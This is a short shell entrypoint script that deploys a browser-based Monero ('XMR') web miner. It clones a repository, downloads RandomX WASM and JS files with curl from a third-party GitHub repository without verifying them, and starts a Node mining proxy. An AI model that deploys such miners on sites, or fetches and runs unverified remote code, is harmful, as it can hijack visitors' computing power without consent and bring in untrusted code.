#!/bin/sh
set -e
REPO="${REPO_URL:-https://github.com/Dequanjae/XMR-WebMIner.git}"
echo "=== XMR Web Miner ==="
cd /app
if [ ! -f proxy/index.js ]; then
  echo "Cloning repo..."
  git clone --depth 1 "$REPO" /tmp/repo 2>/dev/null || true
  cp -r /tmp/repo/* . 2>/dev/null || true
  rm -rf /tmp/repo/.git /tmp/repo
fi
if [ ! -f public/randomx.wasm ]; then
  echo "Downloading RandomX WASM..."
  mkdir -p public
  curl -sL "https://github.com/aa022/RandomX-bonanza/raw/main/public/randomx.wasm" -o public/randomx.wasm
fi
if [ ! -f public/randomx.js ]; then
  echo "Downloading RandomX JS..."
  curl -sL "https://github.com/aa022/RandomX-bonanza/raw/main/public/randomx.js" -o public/randomx.js
fi
echo "Starting proxy..."
exec node proxy/index.js
